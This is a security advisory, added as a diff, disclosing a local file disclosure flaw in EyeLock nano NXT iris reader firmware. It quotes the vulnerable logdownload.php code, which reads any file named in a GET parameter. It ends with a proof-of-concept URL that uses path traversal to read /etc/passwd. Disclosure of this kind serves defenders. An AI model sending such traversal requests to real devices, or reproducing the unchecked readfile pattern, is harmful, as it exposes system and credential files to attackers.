@@ -1,0 +1,55 @@
+﻿EyeLock nano NXT 3.5 Local File Disclosure Vulnerability
+
+
+Vendor: EyeLock, LLC
+Product web page: http://www.eyelock.com
+Affected version: NXT Firmware: 3.05.1193 (ICM: 3.5.1)
+                  NXT Firmware: 3.04.1108 (ICM: 3.4.13)
+                  NXT Firmware: 3.03.944  (ICM: 3.3.2)
+                  NXT Firmware: 3.01.646  (ICM: 3.1.13)
+
+Platform: Hardware (Biometric Iris Reader (master))
+
+Summary: Nano NXT is the most advanced compact iris-based identity authentication device
+in Eyelock's comprehensive suite of end-to-end identity authentication solutions.
+Nano NXT is a miniaturized iris-based recognition system capable of providing
+real-time identification, both in-motion and at a distance. The Nano NXT is an
+ideal replacement for card-based systems, and seamlessly controls access to turnstiles,
+secured entrances, server rooms and any other physical space. Similarly the device
+is powerful and compact enough to secure high-value transactions, critical databases,
+network workstations or any other information system.
+
+Desc: nano NXT suffers from a file disclosure vulnerability when input passed thru the
+'path' parameter to 'logdownload.php' script is not properly verified before being used
+to read files. This can be exploited to disclose contents of files from local resources.
+
+==================================================================================
+/scripts/logdownload.php:
+-------------------------
+1: <?php 
+2:    header("Content-Type: application/octet-stream");
+3:    header("Content-Disposition: attachment; filename={$_GET['dlfilename']}");
+4:    readfile($_GET['path']);
+5: ?>
+==================================================================================
+
+Tested on: GNU/Linux (armv7l)
+           lighttpd/1.4.35
+           SQLite/3.8.7.2
+           PHP/5.6.6
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                             @zeroscience
+
+
+Advisory ID: ZSL-2016-5356
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5356.php
+
+
+10.06.2016
+
+--
+
+
+http://192.168.40.1/scripts/logdownload.php?dlfilename=juicyinfo.txt&path=../../../../../../../../etc/passwd
